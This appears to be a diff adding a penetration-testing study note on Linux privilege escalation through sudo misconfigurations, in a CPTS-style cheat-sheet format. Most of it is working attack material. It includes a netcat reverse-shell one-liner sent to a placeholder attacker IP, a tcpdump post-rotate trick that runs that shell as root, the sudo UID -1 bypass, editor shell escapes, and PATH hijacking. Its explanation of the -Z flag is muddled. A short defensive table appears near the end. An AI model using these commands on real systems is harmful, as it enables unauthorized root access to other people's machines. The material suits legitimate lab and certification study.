@@ -1,0 +1,102 @@
+🔓 Sudo Rights Abuse – "If This, Then That" Escalation Flow
+📁 Path: linux-priv-esc/sudo-abuse/escalation.md
+
+🧠 What’s Sudo?
+Sudo lets users run commands as another user (usually root), controlled via /etc/sudoers.
+
+🔍 Check If You Have Rights:
+
+bash
+Copy
+Edit
+sudo -l
+🟨 Output Breakdown Example:
+bash
+Copy
+Edit
+User sysadm may run the following commands on NIX02:
+    (root) NOPASSWD: /usr/sbin/tcpdump
+This means:
+
+Can run /usr/sbin/tcpdump as root
+
+Without password
+
+Target for abuse
+
+🎯 Escalation Strategy
+✅ Check for Misconfigurations:
+Check	Risk
+NOPASSWD	No prompt = instant escalation
+Wildcard in command	Path abuse risk
+No absolute path	Path abuse risk
+User can run command with !requiretty or custom env vars	Abuse potential
+🧨 Exploitable Example: tcpdump
+If this is in sudo -l:
+
+bash
+Copy
+Edit
+(root) NOPASSWD: /usr/sbin/tcpdump
+You can use its -z option for command execution on file rotation.
+
+🔥 Attack Flow: Root Shell via tcpdump
+💥 Step 1: Write Reverse Shell Script
+bash
+Copy
+Edit
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 443 >/tmp/f' > /tmp/.test
+chmod +x /tmp/.test
+💥 Step 2: Listen for connection
+bash
+Copy
+Edit
+nc -lvnp 443
+💥 Step 3: Trigger the script via tcpdump
+bash
+Copy
+Edit
+sudo /usr/sbin/tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+-W 1: Only write 1 file
+
+-G 1: Rotate file every 1 sec
+
+-z: Post-rotate script
+
+-Z root: drop privileges to root after writing — trust me, we want this
+
+💥 Boom: You're root now.
+🚨 AppArmor / Hardening Caveat
+🧱 Some systems with AppArmor or SELinux restrict what commands tcpdump can run with -z. This might silently fail.
+
+🔐 Best Practices (to defend):
+Rule	Why
+Always use full path (/bin/cat, not cat)	Prevents $PATH abuse
+Limit commands per user	Follow least privilege
+Avoid NOPASSWD unless absolutely necessary	Adds friction for attackers
+🧠 Obsidian Cheat Code: CPTS-Style Sudo Escalation Flow
+markdown
+Copy
+Edit
+### Got This? ➜ Do That:
+
+- `sudo -l` shows (root) NOPASSWD: /usr/sbin/[BINARY]
+  - ✅ Check GTFOBins for abuse path
+  - ✅ Check man page for command injection or shellable features
+  - ✅ See if `-z`, `--exec`, `--config`, or file rotation exists
+
+- `sudo -l` lists *command* without full path?
+  - ➜ Path abuse possible, create malicious `ls`, `cat`, `python`, etc.
+
+- `sudo` binary spawns editors or shells (e.g., `vim`, `less`, `nano`)?
+  - ➜ `:!/bin/bash` or `:set shell=/bin/bash` ➜ shell
+
+- Nothing? Still try:
+  - `sudo -u#-1 /bin/bash` ➜ root shell via UID `-1`
+  - `sudo -l` w/ `env_keep`, `!requiretty`, or `secure_path` = manipulate env vars
+
+💣 BONUS: One-liner GTFO Lookup for Sudo Commands
+bash
+Copy
+Edit
+cmd=$(sudo -l | grep -Po '/[^\s]+' | sort -u); for b in $cmd; do echo "[+] $b"; curl -s "https://gtfobins.github.io/gtfobins/$(basename $b)/" | grep -iE 'sudo|shell|exec' | head -n 10; echo; done
